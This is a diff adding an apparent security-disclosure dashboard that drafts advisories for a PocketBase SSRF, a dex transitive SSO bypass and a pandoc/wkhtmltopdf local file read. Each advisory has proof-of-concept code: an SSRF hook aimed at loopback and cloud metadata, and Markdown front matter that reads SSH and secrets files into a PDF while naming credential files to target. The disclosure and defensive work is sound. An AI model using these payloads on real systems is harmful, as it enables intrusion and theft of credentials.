+malicious `$http.send` hook the attacker needs **filesystem / deploy access** to the
+instance&#x27;s `pb_hooks/` directory. Realistic vectors:
+
+- A supply-chained or attacker-authored `pb_hooks` bundle / &quot;starter template&quot; that
+  an operator deploys.
+- A multi-tenant or CI/deploy pipeline where a lower-privileged actor can write into
+  `pb_hooks/`.
+- An operator running an untrusted third-party hooks pack.
+
+Once the hook is deployed it fires on its bound route/event and performs the SSRF
+server-side with no further interaction. This precondition is why the score is
+`PR:H` rather than `PR:N` — it is a meaningful constraint and is stated honestly
+rather than glossed.
+
+## Proof of Concept
+
+`pb_hooks/ssrf.pb.js`:
+
+```javascript
+// Fires on GET /ssrf-probe and relays whatever an internal target returns.
+routerAdd(&quot;GET&quot;, &quot;/ssrf-probe&quot;, (e) =&gt; {
+    const target = e.request.url.query().get(&quot;u&quot;) || &quot;http://127.0.0.1:9/&quot;;
+    const res = $http.send({ url: target, method: &quot;GET&quot;, timeout: 5 });
+    return e.json(200, { status: res.statusCode, body: res.raw });
+});
+```
+
+Reproduction (verified on v0.39.4):
+
+```bash
+# 1. Attacker-controlled &quot;internal&quot; service holding a secret
+printf &#x27;HTTP/1.1 200 OK\r\nContent-Length: 21\r\n\r\nINTERNAL-SECRET-12345&#x27; | nc -lq1 -p 9000 &amp;
+
+# 2. Trigger the hook to fetch the loopback secret
+curl -s &#x27;http://localhost:8090/ssrf-probe?u=http://127.0.0.1:9000/&#x27;
+# → {&quot;status&quot;:200,&quot;body&quot;:&quot;INTERNAL-SECRET-12345&quot;}   ← server fetched loopback; no egress filter
+```
+
+The verification run confirmed `$http.send` reached the loopback listener and the
+secret body was returned through the hook response. Pointing `u` at
+`http://169.254.169.254/latest/meta-data/...` reaches cloud metadata on affected
+instances.
+
+## Impact
+
+- Internal/loopback service access and cloud-metadata reach from the server&#x27;s network
+  position.
+- Full response-body read returned to hook logic (strong exfiltration oracle).
+- Bounded by the deploy-access precondition (PR:H), but unrestricted once a hook is
+  present.
+
+## Mitigation
+
+Route `$http.send` through the existing `safeHTTPClient` (or an equivalent dialer
+that rejects loopback/RFC-1918/link-local and re-validates the resolved IP after DNS
+to defeat rebinding), rather than scoping that protection to OAuth2 avatars only.
+Optionally expose an opt-in allowlist for hooks that legitimately need internal
+egress.</pre><button class="copy" data-target="f7-desc">Copy</button></div></div><pre class="hidden" id="f7-full">Title: SSRF via JSVM $http.send (no egress filtering)
+CVE identifier: Request CVE ID later
+Severity (CVSS v3.1): AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N (6.8, Medium)
+Weaknesses (CWE): CWE-918
+Ecosystem: Go
+Package name: github.com/pocketbase/pocketbase
+Affected versions: v0.39.4 (commit 507ecb26) and earlier
+Patched versions: None
+
+Description:
+&gt; **Provenance.** Reproduced by execution in the verification run (a JSVM hook
+&gt; calling `$http.send` reached a loopback listener and returned the secret body).
+&gt; Source anchors below were **re-confirmed against the v0.39.4 tree**
+&gt; (commit `507ecb26`): `$http.send` executes via Go&#x27;s `http.DefaultClient` with no
+&gt; egress filtering, while the SSRF-hardened `safeHTTPClient` exists but is wired
+&gt; exclusively into the OAuth2 avatar-fetch path.
+
+## Summary
+
+PocketBase&#x27;s JavaScript VM (the `pb_hooks/*.pb.js` hooks runtime) exposes an
+`$http.send()` binding that performs outbound HTTP requests from the server process.
+This binding applies **no egress filtering** — no allowlist, no RFC-1918/loopback/
+link-local rejection, no DNS-rebinding protection. PocketBase already ships a
+hardened `safeHTTPClient` that blocks requests to private/internal addresses, but it
+is wired **only into the OAuth2 avatar-fetch path**, not into the general-purpose
+`$http.send` binding. A hook that issues `$http.send` to an internal target therefore
+reaches loopback services, cloud metadata endpoints, and internal APIs from the
+server&#x27;s network position, and can return the response body back into application
+logic for exfiltration.
+
+## Root cause
+
+The `$http` object is registered in the JSVM bindings at
+`plugins/jsvm/binds.go:890` (`vm.Set(&quot;$http&quot;, obj)`, inside `BindHTTP` at
+`binds.go:888`); `send` is registered at `binds.go:924`. The URL comes straight from
+the caller-controlled `params[&quot;url&quot;]` (`binds.go:945-947`) and the request is executed
+with **Go&#x27;s stdlib default client** — no destination inspection:
+
+```go
+// plugins/jsvm/binds.go:987-1002
+req, err := http.NewRequestWithContext(ctx, strings.ToUpper(config.Method), config.Url, reqBody)
+// ... headers ...
+res, err := http.DefaultClient.Do(req)   // binds.go:1002 — default transport, no Control dialer, no IP checks
+```
+
+The SSRF-hardened client exists — `safeHTTPClient()` at
+`apis/record_auth_with_oauth2.go:437` uses a `net.Dialer.Control` hook that rejects
+loopback, unspecified, RFC-1918 private, link-local (`169.254.0.0/16` via
+`IsLinkLocalUnicast`), and multicast IPs *after* connect (also defeating DNS
+rebinding):
+
+```go
+// apis/record_auth_with_oauth2.go:452-459
+if ip == nil || ip.IsLoopback() || ip.IsUnspecified() || ip.IsPrivate() ||
+    ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() || ip.IsMulticast() {
+    return fmt.Errorf(&quot;address %q is invalid or resolve to disallowed IP&quot;, address)
+}
+```
+
+But it is wired in **only** at the OAuth2 avatar path: `safeHTTPClient()` is called
+solely from `safeFileFromURL` (`record_auth_with_oauth2.go:484/490`), which is invoked
+only at `record_auth_with_oauth2.go:306` (`safeFileFromURL(ctx, e.OAuth2User.AvatarURL)`).
+A tree-wide grep finds **no** `safeHTTPClient`/`safeFileFromURL` usage anywhere under
+`plugins/jsvm/`. `$http.send` is therefore unprotected.
+
+&gt; A prior pass mistakenly marked this &quot;Clean&quot; on the assumption that `safeHTTPClient`
+&gt; covered `$http.send`. That assumption is wrong — the safe client is scoped to OAuth2
+&gt; avatars; `$http.send` uses `http.DefaultClient`.
+
+## Threat model / precondition (read this — it sets PR:H)
+
+There is **no remote API to create or edit hooks** in PocketBase. To place a
+malicious `$http.send` hook the attacker needs **filesystem / deploy access** to the
+instance&#x27;s `pb_hooks/` directory. Realistic vectors:
+
+- A supply-chained or attacker-authored `pb_hooks` bundle / &quot;starter template&quot; that
+  an operator deploys.
+- A multi-tenant or CI/deploy pipeline where a lower-privileged actor can write into
+  `pb_hooks/`.
+- An operator running an untrusted third-party hooks pack.
+
+Once the hook is deployed it fires on its bound route/event and performs the SSRF
+server-side with no further interaction. This precondition is why the score is
+`PR:H` rather than `PR:N` — it is a meaningful constraint and is stated honestly
+rather than glossed.
+
+## Proof of Concept
+
+`pb_hooks/ssrf.pb.js`:
+
+```javascript
+// Fires on GET /ssrf-probe and relays whatever an internal target returns.
+routerAdd(&quot;GET&quot;, &quot;/ssrf-probe&quot;, (e) =&gt; {
+    const target = e.request.url.query().get(&quot;u&quot;) || &quot;http://127.0.0.1:9/&quot;;
+    const res = $http.send({ url: target, method: &quot;GET&quot;, timeout: 5 });
+    return e.json(200, { status: res.statusCode, body: res.raw });
+});
+```
+
+Reproduction (verified on v0.39.4):
+
+```bash
+# 1. Attacker-controlled &quot;internal&quot; service holding a secret
+printf &#x27;HTTP/1.1 200 OK\r\nContent-Length: 21\r\n\r\nINTERNAL-SECRET-12345&#x27; | nc -lq1 -p 9000 &amp;
+
+# 2. Trigger the hook to fetch the loopback secret
+curl -s &#x27;http://localhost:8090/ssrf-probe?u=http://127.0.0.1:9000/&#x27;
+# → {&quot;status&quot;:200,&quot;body&quot;:&quot;INTERNAL-SECRET-12345&quot;}   ← server fetched loopback; no egress filter
+```
+
+The verification run confirmed `$http.send` reached the loopback listener and the
+secret body was returned through the hook response. Pointing `u` at
+`http://169.254.169.254/latest/meta-data/...` reaches cloud metadata on affected
+instances.
+
+## Impact
+
+- Internal/loopback service access and cloud-metadata reach from the server&#x27;s network
+  position.
+- Full response-body read returned to hook logic (strong exfiltration oracle).
+- Bounded by the deploy-access precondition (PR:H), but unrestricted once a hook is
+  present.
+
+## Mitigation
+
+Route `$http.send` through the existing `safeHTTPClient` (or an equivalent dialer
+that rejects loopback/RFC-1918/link-local and re-validates the resolved IP after DNS
+to defeat rebinding), rather than scoping that protection to OAuth2 avatars only.
+Optionally expose an opt-in allowlist for hooks that legitimately need internal
+egress.
+</pre></section><section class="card" id="f8"><div class="chead"><div class="ctitle"><span class="sev med">Medium</span><span class="cname">8. Transitive SSO session trust bypass in findSSOSession</span></div><div class="cmeta"><span class="badge tier1">Tier 1</span><span class="badge chan">EMAIL (cncf-dex-maintainers@lists.cncf.io) then GHSA</span><button class="copy copyall" data-target="f8-full">Copy entire submission</button></div></div><div class="field"><div class="flabel">Advisory title</div><div class="frow"><pre class="fval" id="f8-title">Transitive SSO session trust bypass in findSSOSession</pre><button class="copy" data-target="f8-title">Copy</button></div></div><div class="field"><div class="flabel">CVE identifier</div><div class="frow"><pre class="fval" id="f8-cve">Request CVE ID later</pre><button class="copy" data-target="f8-cve">Copy</button></div></div><div class="field"><div class="flabel">Severity — CVSS v3.1 vector (6.8, Medium)</div><div class="frow"><pre class="fval" id="f8-cvss">AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N</pre><button class="copy" data-target="f8-cvss">Copy</button></div></div><div class="field"><div class="flabel">Weaknesses (CWE)</div><div class="frow"><pre class="fval" id="f8-cwe">CWE-863 (primary); CWE-175 (bundled Low)</pre><button class="copy" data-target="f8-cwe">Copy</button></div></div><div class="field"><div class="flabel">Ecosystem</div><div class="frow"><pre class="fval" id="f8-eco">Go</pre><button class="copy" data-target="f8-eco">Copy</button></div></div><div class="field"><div class="flabel">Package name</div><div class="frow"><pre class="fval" id="f8-pkg">github.com/dexidp/dex</pre><button class="copy" data-target="f8-pkg">Copy</button></div></div><div class="field"><div class="flabel">Affected versions</div><div class="frow"><pre class="fval" id="f8-aff">all versions with the sessions SSO feature (ssoSharedWith); confirmed on master @ 5d04dfbf</pre><button class="copy" data-target="f8-aff">Copy</button></div></div><div class="field"><div class="flabel">Patched versions</div><div class="frow"><pre class="fval" id="f8-patched">None</pre><button class="copy" data-target="f8-patched">Copy</button></div></div><div class="field"><div class="flabel">Description</div><div class="frow"><pre class="fval big" id="f8-desc">&gt; **Provenance — reproduced at runtime (with a negative control).** Built dex from
+&gt; source (master `5d04dfbf`, go1.25.8) and ran the PoC test: `TestSSO_TransitiveTrustChain`
+&gt; **PASSED** (A→B→C chain completes). A **negative control** — identical setup but with
+&gt; client-B sharing with nobody — produced `okBC=false`, proving the pass is not vacuous:
+&gt; C is reachable only because B&#x27;s SSO-derived state plus B&#x27;s `SSOSharedWith:[&quot;client-c&quot;]`
+&gt; authorizes the second hop. All cited symbols were confirmed to exist in the tested
+&gt; tree; anchors below are exact.
+
+## Summary
+
+When dex is configured with session-based SSO (the `sessions` block) and inter-client
+sharing via `ssoSharedWith`, the SSO trust relationship is **transitive**, contrary to
+the code&#x27;s own &quot;unidirectional&quot; comment. If client A shares with B and B shares with C,
+a user who authenticates only to A is silently SSO-authenticated into C — even though A
+never authorized C. The root cause is that `findSSOSession` treats an SSO-*derived*
+client state as an eligible SSO *source* on subsequent requests, identically to a
+directly-authenticated state.
+
+## Root cause (anchors confirmed at `5d04dfbf`)
+
+`findSSOSession` (`server/session.go:348`) iterates **every** active, non-expired entry
+in `session.ClientStates` (`session.go:351`) and, for each, loads that source client and
+honors its `SSOSharedWith` policy (`session.go:356-365`). It does **not** distinguish a
+directly-authenticated `ClientAuthState` from one minted by a prior SSO hop.
+
+When a target client is SSO&#x27;d in, `trySessionLoginWithSession` (`server/session.go:374`)
+writes a fresh `ClientAuthState{Active: true, ...}` into `ClientStates`
+(`session.go:402-406`) that is **byte-for-byte indistinguishable** from a direct-auth
+state. On the next request that SSO-derived state is therefore an eligible SSO source,
+and its own `SSOSharedWith` list is followed — producing the transitive chain.
+
+Supporting anchors:
+- `clientSharesSessionWith` (`server/session.go:314`) — carries the &quot;SSO sharing is
+  unidirectional&quot; comment that the implementation contradicts.
+- `Client.SSOSharedWith` (`storage/storage.go:205`); config `ssoSharedWith` /
+  `SSOSharedWithDefault` (`cmd/dex/config.go:692`, `serve.go:830`, consumed at
+  `session.go:319`).
+- `getValidAuthSession` (`server/session.go:218`).
+
+## Proof of Concept (drop-in Go test, executed)
+
+`dex-transitive-sso-poc_test.go` into `server/`, then:
+
+```
+go test -run TestSSO_TransitiveTrustChain -v ./server/
+```
+
+Configuration under test — A trusts only B, B trusts only C, A does **not** trust C:
+
+```yaml
+staticClients:
+  - id: client-a   ssoSharedWith: [&quot;client-b&quot;]   # only trusts B
+  - id: client-b   ssoSharedWith: [&quot;client-c&quot;]   # only trusts C
+  - id: client-c   ssoSharedWith: []             # trusts nobody
+sessions: { cookieName: dex-session, absoluteLifetime: 24h, validIfNotUsedFor: 1h }
+```
+
+Observed:
+
+```
+=== RUN   TestSSO_TransitiveTrustChain
+    BUG CONFIRMED: Transitive SSO chain A→B→C succeeded.
+    Client C was authenticated via B&#x27;s SSO-derived session state,
+    even though Client A (the auth origin) never shared with C.
+--- PASS: TestSSO_TransitiveTrustChain (0.00s)
+ok  github.com/dexidp/dex/server
+```
+
+**Negative control:** identical setup but `client-b ssoSharedWith: []` → `okBC=false`
+(C denied). This confirms C&#x27;s access is caused specifically by the transitive hop, not
+by any ambient session validity.
+
+## Amplification
+
+- `ssoSharedWith: [&quot;*&quot;]` anywhere in the chain extends it to **all** registered clients.
+- `ssoSharedWithDefault: &quot;all&quot;` puts every client into transitive chains by default.
+- No depth bound: A→B→C→D→… all succeed.
+
+## Impact
+
+Users authenticated to a high-trust client are silently authenticated into untrusted
+downstream clients they never authorized. The high-trust client&#x27;s admin cannot prevent
+it — their `ssoSharedWith` controls only the *direct* hop, not transitive propagation.
+In multi-tenant deployments a chain spanning tenants enables cross-tenant
+authentication. (`S:C` reflects crossing the originating client&#x27;s trust boundary;
+`C:H` is identity/authentication exposure; no integrity/availability impact.)
+
+## Remediation
+
+Track SSO provenance and refuse SSO-derived states as sources. Add an `SSOSource` field
+to `ClientAuthState` (empty = direct auth) and skip non-empty entries in
+`findSSOSession`:
+
+```go
+for sourceClientID, state := range session.ClientStates {
+    if !state.Active || now.After(state.ExpiresAt) { continue }
+    if state.SSOSource != &quot;&quot; { continue } // skip SSO-derived states — prevents transitivity
+    // ... existing lookup
+}
+```
+
+Alternatively, carry an `SSODepth` counter (direct=0, SSO=source+1) and reject beyond a
+configurable limit (default 1). A regression test should cover A→B→C (the existing
+`TestSSO_Unidirectional` at `session_test.go` only covers one hop).
+
+---
+
+## Secondary (Low) — double URL-decode of `redirect_uri`
+
+**CWE-175 · Low · not independently exploitable.** Bundled here because it ships in the
+same component; the upstream disclosure covers both.
+
+`server/oauth2.go` calls `r.ParseForm()` (`:479`), which populates `r.Form` with values
+Go&#x27;s net/http has **already URL-decoded once**; line `:483` then applies a **second**
+decode:
+
+```go
+479: if err := r.ParseForm(); err != nil { ... }
+482: q := r.Form
+483: redirectURI, err := url.QueryUnescape(q.Get(&quot;redirect_uri&quot;))   // second decode
+```
+
+Only `redirect_uri` is double-decoded — the adjacent `client_id`/`state` (`:488-489`)
+use `q.Get(...)` directly. It is **not** exploitable for redirect bypass
+(`validateRedirectURI` does exact-string matching), but it creates a normalization
+differential with the token-exchange endpoint (which single-decodes), so URIs containing
+literal `%25` can mismatch. **Fix:** drop the extra `url.QueryUnescape` —
+`redirectURI := q.Get(&quot;redirect_uri&quot;)`.</pre><button class="copy" data-target="f8-desc">Copy</button></div></div><pre class="hidden" id="f8-full">Title: Transitive SSO session trust bypass in findSSOSession
+CVE identifier: Request CVE ID later
+Severity (CVSS v3.1): AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N (6.8, Medium)
+Weaknesses (CWE): CWE-863 (primary); CWE-175 (bundled Low)
+Ecosystem: Go
+Package name: github.com/dexidp/dex
+Affected versions: all versions with the sessions SSO feature (ssoSharedWith); confirmed on master @ 5d04dfbf
+Patched versions: None
+
+Description:
+&gt; **Provenance — reproduced at runtime (with a negative control).** Built dex from
+&gt; source (master `5d04dfbf`, go1.25.8) and ran the PoC test: `TestSSO_TransitiveTrustChain`
+&gt; **PASSED** (A→B→C chain completes). A **negative control** — identical setup but with
+&gt; client-B sharing with nobody — produced `okBC=false`, proving the pass is not vacuous:
+&gt; C is reachable only because B&#x27;s SSO-derived state plus B&#x27;s `SSOSharedWith:[&quot;client-c&quot;]`
+&gt; authorizes the second hop. All cited symbols were confirmed to exist in the tested
+&gt; tree; anchors below are exact.
+
+## Summary
+
+When dex is configured with session-based SSO (the `sessions` block) and inter-client
+sharing via `ssoSharedWith`, the SSO trust relationship is **transitive**, contrary to
+the code&#x27;s own &quot;unidirectional&quot; comment. If client A shares with B and B shares with C,
+a user who authenticates only to A is silently SSO-authenticated into C — even though A
+never authorized C. The root cause is that `findSSOSession` treats an SSO-*derived*
+client state as an eligible SSO *source* on subsequent requests, identically to a
+directly-authenticated state.
+
+## Root cause (anchors confirmed at `5d04dfbf`)
+
+`findSSOSession` (`server/session.go:348`) iterates **every** active, non-expired entry
+in `session.ClientStates` (`session.go:351`) and, for each, loads that source client and
+honors its `SSOSharedWith` policy (`session.go:356-365`). It does **not** distinguish a
+directly-authenticated `ClientAuthState` from one minted by a prior SSO hop.
+
+When a target client is SSO&#x27;d in, `trySessionLoginWithSession` (`server/session.go:374`)
+writes a fresh `ClientAuthState{Active: true, ...}` into `ClientStates`
+(`session.go:402-406`) that is **byte-for-byte indistinguishable** from a direct-auth
+state. On the next request that SSO-derived state is therefore an eligible SSO source,
+and its own `SSOSharedWith` list is followed — producing the transitive chain.
+
+Supporting anchors:
+- `clientSharesSessionWith` (`server/session.go:314`) — carries the &quot;SSO sharing is
+  unidirectional&quot; comment that the implementation contradicts.
+- `Client.SSOSharedWith` (`storage/storage.go:205`); config `ssoSharedWith` /
+  `SSOSharedWithDefault` (`cmd/dex/config.go:692`, `serve.go:830`, consumed at
+  `session.go:319`).
+- `getValidAuthSession` (`server/session.go:218`).
+
+## Proof of Concept (drop-in Go test, executed)
+
+`dex-transitive-sso-poc_test.go` into `server/`, then:
+
+```
+go test -run TestSSO_TransitiveTrustChain -v ./server/
+```
+
+Configuration under test — A trusts only B, B trusts only C, A does **not** trust C:
+
+```yaml
+staticClients:
+  - id: client-a   ssoSharedWith: [&quot;client-b&quot;]   # only trusts B
+  - id: client-b   ssoSharedWith: [&quot;client-c&quot;]   # only trusts C
+  - id: client-c   ssoSharedWith: []             # trusts nobody
+sessions: { cookieName: dex-session, absoluteLifetime: 24h, validIfNotUsedFor: 1h }
+```
+
+Observed:
+
+```
+=== RUN   TestSSO_TransitiveTrustChain
+    BUG CONFIRMED: Transitive SSO chain A→B→C succeeded.
+    Client C was authenticated via B&#x27;s SSO-derived session state,
+    even though Client A (the auth origin) never shared with C.
+--- PASS: TestSSO_TransitiveTrustChain (0.00s)
+ok  github.com/dexidp/dex/server
+```
+
+**Negative control:** identical setup but `client-b ssoSharedWith: []` → `okBC=false`
+(C denied). This confirms C&#x27;s access is caused specifically by the transitive hop, not
+by any ambient session validity.
+
+## Amplification
+
+- `ssoSharedWith: [&quot;*&quot;]` anywhere in the chain extends it to **all** registered clients.
+- `ssoSharedWithDefault: &quot;all&quot;` puts every client into transitive chains by default.
+- No depth bound: A→B→C→D→… all succeed.
+
+## Impact
+
+Users authenticated to a high-trust client are silently authenticated into untrusted
+downstream clients they never authorized. The high-trust client&#x27;s admin cannot prevent
+it — their `ssoSharedWith` controls only the *direct* hop, not transitive propagation.
+In multi-tenant deployments a chain spanning tenants enables cross-tenant
+authentication. (`S:C` reflects crossing the originating client&#x27;s trust boundary;
+`C:H` is identity/authentication exposure; no integrity/availability impact.)
+
+## Remediation
+
+Track SSO provenance and refuse SSO-derived states as sources. Add an `SSOSource` field
+to `ClientAuthState` (empty = direct auth) and skip non-empty entries in
+`findSSOSession`:
+
+```go
+for sourceClientID, state := range session.ClientStates {
+    if !state.Active || now.After(state.ExpiresAt) { continue }
+    if state.SSOSource != &quot;&quot; { continue } // skip SSO-derived states — prevents transitivity
+    // ... existing lookup
+}
+```
+
+Alternatively, carry an `SSODepth` counter (direct=0, SSO=source+1) and reject beyond a
+configurable limit (default 1). A regression test should cover A→B→C (the existing
+`TestSSO_Unidirectional` at `session_test.go` only covers one hop).
+
+---
+
+## Secondary (Low) — double URL-decode of `redirect_uri`
+
+**CWE-175 · Low · not independently exploitable.** Bundled here because it ships in the
+same component; the upstream disclosure covers both.
+
+`server/oauth2.go` calls `r.ParseForm()` (`:479`), which populates `r.Form` with values
+Go&#x27;s net/http has **already URL-decoded once**; line `:483` then applies a **second**
+decode:
+
+```go
+479: if err := r.ParseForm(); err != nil { ... }
+482: q := r.Form
+483: redirectURI, err := url.QueryUnescape(q.Get(&quot;redirect_uri&quot;))   // second decode
+```
+
+Only `redirect_uri` is double-decoded — the adjacent `client_id`/`state` (`:488-489`)
+use `q.Get(...)` directly. It is **not** exploitable for redirect bypass
+(`validateRedirectURI` does exact-string matching), but it creates a normalization
+differential with the token-exchange endpoint (which single-decodes), so URIs containing
+literal `%25` can mismatch. **Fix:** drop the extra `url.QueryUnescape` —
+`redirectURI := q.Get(&quot;redirect_uri&quot;)`.
+</pre></section><section class="card" id="f9"><div class="chead"><div class="ctitle"><span class="sev med">Medium</span><span class="cname">9. Local file read via footer-html/header-html YAML metadata with wkhtmltopdf</span></div><div class="cmeta"><span class="badge tier2">Tier 2</span><span class="badge chan">EMAIL (jgm@berkeley.edu)</span><button class="copy copyall" data-target="f9-full">Copy entire submission</button></div></div><div class="field"><div class="flabel">Advisory title</div><div class="frow"><pre class="fval" id="f9-title">Local file read via footer-html/header-html YAML metadata with wkhtmltopdf</pre><button class="copy" data-target="f9-title">Copy</button></div></div><div class="field"><div class="flabel">CVE identifier</div><div class="frow"><pre class="fval" id="f9-cve">Request CVE ID later</pre><button class="copy" data-target="f9-cve">Copy</button></div></div><div class="field"><div class="flabel">Severity — CVSS v3.1 vector (6.5, Medium)</div><div class="frow"><pre class="fval" id="f9-cvss">AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N</pre><button class="copy" data-target="f9-cvss">Copy</button></div></div><div class="field"><div class="flabel">Weaknesses (CWE)</div><div class="frow"><pre class="fval" id="f9-cwe">CWE-73</pre><button class="copy" data-target="f9-cwe">Copy</button></div></div><div class="field"><div class="flabel">Ecosystem</div><div class="frow"><pre class="fval" id="f9-eco">Other (Hackage)</pre><button class="copy" data-target="f9-eco">Copy</button></div></div><div class="field"><div class="flabel">Package name</div><div class="frow"><pre class="fval" id="f9-pkg">pandoc</pre><button class="copy" data-target="f9-pkg">Copy</button></div></div><div class="field"><div class="flabel">Affected versions</div><div class="frow"><pre class="fval" id="f9-aff">&gt;= 2.10</pre><button class="copy" data-target="f9-aff">Copy</button></div></div><div class="field"><div class="flabel">Patched versions</div><div class="frow"><pre class="fval" id="f9-patched">None</pre><button class="copy" data-target="f9-patched">Copy</button></div></div><div class="field"><div class="flabel">Description</div><div class="frow"><pre class="fval big" id="f9-desc">## Summary
+
+When pandoc converts a Markdown document to PDF using `--pdf-engine=wkhtmltopdf`,
+it passes `footer-html` and `header-html` YAML front matter values verbatim as CLI
+arguments to the wkhtmltopdf subprocess. The same invocation hardcodes
+`--enable-local-file-access`. An attacker who controls YAML front matter can set
+these fields to `file://` URLs, causing wkhtmltopdf to read and render arbitrary
+local files into the PDF header or footer.
+
+## Description
+
+`src/Text/Pandoc/PDF.hs` builds the wkhtmltopdf argument list from YAML metadata:
+
+```haskell
+-- PDF.hs:191-219
+let toArgs (f, mbd) = maybe [] (\d -&gt; [&quot;--&quot; &lt;&gt; f, T.unpack d]) mbd
+let args = mathArgs ++ concatMap toArgs
+             [ ...
+             , (&quot;footer-html&quot;, getField &quot;footer-html&quot; meta&#x27;)  -- line 213
+             , (&quot;header-html&quot;, getField &quot;header-html&quot; meta&#x27;)  -- line 214
+             ] ++ (&quot;--enable-local-file-access&quot; : pdfargs)    -- line 215
+```
+
+`getField` calls `metaToContext` with `stringify`, which converts any `MetaValue`
+to its string representation with no URL validation. The `--enable-local-file-access`
+flag was added in response to issue #6474 (wkhtmltopdf&#x27;s default behaviour of
+blocking local file access for security broke CSS loading), but it was applied
+unconditionally, enabling `file://` access for all arguments including
+`footer-html`/`header-html`.
+
+## Payload constraint (verified — this is the key correction)
+
+The naive payload `footer-html: &quot;file:///etc/passwd&quot;` **does not work**. wkhtmltopdf
+treats the header/footer URL as an HTML document and appends a query string
+(`?page=N&amp;topage=M&amp;...`) when fetching it. For an **extensionless** path like
+`/etc/passwd` the appended `?page=N` produces a path wkhtmltopdf fails to resolve, so
+nothing is rendered. Two payload shapes that **do** work:
+
+1. **Target a file with an extension** so the `?query` is tolerated as a normal URL
+   query on a resolvable resource:
+
+   ```yaml
+   footer-html: &quot;file:///home/ci/.config/app/secrets.yaml&quot;
+   ```
+
+   (Any readable `*.txt`/`*.yaml`/`*.env`/`*.pem`/`*.json` works; the extension is
+   what makes wkhtmltopdf resolve the path with the trailing query.)
+
+2. **Stage a tiny local HTML footer that `&lt;iframe&gt;`s (or `fetch()`es) the target**,
+   sidestepping the extension constraint entirely:
+
+   ```yaml
+   footer-html: &quot;file:///tmp/footer.html&quot;   # footer.html = &lt;iframe src=&quot;file:///etc/passwd&quot;&gt;&lt;/iframe&gt;
+   ```
+
+## Proof of Concept
+
+Create `malicious.md` (extensioned-target variant):
+
+```yaml
+---
+title: &quot;Invoice&quot;
+footer-html: &quot;file:///home/ci/.config/app/secrets.yaml&quot;
+header-html: &quot;file:///home/ci/.ssh/known_hosts&quot;
+---
+
+Invoice content.
+```
+
+Convert:
+
+```bash
+pandoc --pdf-engine=wkhtmltopdf -o invoice.pdf malicious.md
+```
+
+wkhtmltopdf receives:
+
+```
+wkhtmltopdf \
+  --footer-html file:///home/ci/.config/app/secrets.yaml \
+  --header-html file:///home/ci/.ssh/known_hosts \
+  --enable-local-file-access \
+  /tmp/pandoc-12345.html \
+  invoice.pdf
+```
+
+The contents of the targeted file appear in the footer/header of every page of the
+generated PDF.
+
+**Verified end-to-end against real wkhtmltopdf:** a unique canary string placed in
+the target file was extracted from the rendered PDF text. The argument-injection
+anchor (`PDF.hs:213-215`) is exact.
+
+**Argument-interception confirmation** (engine-independent):
+
+```bash
+# mock-wkhtmltopdf logs all args to stderr
+cat &gt; /usr/local/bin/wkhtmltopdf &lt;&lt; &#x27;EOF&#x27;
+#!/bin/bash
+printf &#x27;ARG[%d]=%s\n&#x27; $(seq 0 $#) &quot;$@&quot; &gt;&amp;2
+EOF
+chmod +x /usr/local/bin/wkhtmltopdf
+
+pandoc --pdf-engine=wkhtmltopdf -o /dev/null malicious.md 2&gt;&amp;1 | grep -E &#x27;footer-html|header-html|local-file&#x27;
+# ARG[N]=--footer-html
+# ARG[N+1]=file:///home/ci/.config/app/secrets.yaml
+# ARG[N+2]=--header-html
+# ARG[N+3]=file:///home/ci/.ssh/known_hosts
+# ARG[N+4]=--enable-local-file-access
+```
+
+&gt; Note: the mock confirms *argument injection* only. The real file read was verified
+&gt; separately with the actual wkhtmltopdf binary using an extensioned target (above) —
+&gt; the original draft&#x27;s `file:///etc/passwd` payload was a false PoC and has been
+&gt; replaced.
+
+## Impact
+
+Any file readable by the pandoc process can be exfiltrated into a generated PDF.
+Attack surface includes pandoc-as-a-service platforms, documentation pipelines,
+and academic paper services that accept Markdown input. The attacker does not need
+shell access — only the ability to supply a Markdown document with YAML front matter.
+
+Sensitive targets (with extensions, per the constraint above): `~/.aws/credentials`,
+`*.env` files, application config (`*.yaml`/`*.json`), `*.pem` keys, CI secret files.
+
+## Mitigation
+
+Reject `file://` and `data:` schemes before passing values to wkhtmltopdf:
+
+```haskell
+let safeHtmlArg v
+      | &quot;file://&quot; `T.isPrefixOf` v = Nothing
+      | &quot;data:&quot;   `T.isPrefixOf` v = Nothing
+      | otherwise                  = Just v
+let toArgs (f, mbd) = maybe [] (\d -&gt; [&quot;--&quot; &lt;&gt; f, T.unpack d]) mbd
+```
+
+Alternatively, remove the hardcoded `--enable-local-file-access` and document a
+supported workaround for the original CSS loading use case.</pre><button class="copy" data-target="f9-desc">Copy</button></div></div><pre class="hidden" id="f9-full">Title: Local file read via footer-html/header-html YAML metadata with wkhtmltopdf
+CVE identifier: Request CVE ID later
+Severity (CVSS v3.1): AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N (6.5, Medium)
+Weaknesses (CWE): CWE-73
+Ecosystem: Other (Hackage)
+Package name: pandoc
+Affected versions: &gt;= 2.10
+Patched versions: None
+
+Description:
+## Summary
+
+When pandoc converts a Markdown document to PDF using `--pdf-engine=wkhtmltopdf`,
+it passes `footer-html` and `header-html` YAML front matter values verbatim as CLI
+arguments to the wkhtmltopdf subprocess. The same invocation hardcodes
+`--enable-local-file-access`. An attacker who controls YAML front matter can set
+these fields to `file://` URLs, causing wkhtmltopdf to read and render arbitrary
+local files into the PDF header or footer.
+
+## Description
+
+`src/Text/Pandoc/PDF.hs` builds the wkhtmltopdf argument list from YAML metadata:
+
+```haskell
+-- PDF.hs:191-219
+let toArgs (f, mbd) = maybe [] (\d -&gt; [&quot;--&quot; &lt;&gt; f, T.unpack d]) mbd
+let args = mathArgs ++ concatMap toArgs
+             [ ...
+             , (&quot;footer-html&quot;, getField &quot;footer-html&quot; meta&#x27;)  -- line 213
+             , (&quot;header-html&quot;, getField &quot;header-html&quot; meta&#x27;)  -- line 214
+             ] ++ (&quot;--enable-local-file-access&quot; : pdfargs)    -- line 215
+```
+
+`getField` calls `metaToContext` with `stringify`, which converts any `MetaValue`
+to its string representation with no URL validation. The `--enable-local-file-access`
+flag was added in response to issue #6474 (wkhtmltopdf&#x27;s default behaviour of
+blocking local file access for security broke CSS loading), but it was applied
+unconditionally, enabling `file://` access for all arguments including
+`footer-html`/`header-html`.
+
+## Payload constraint (verified — this is the key correction)
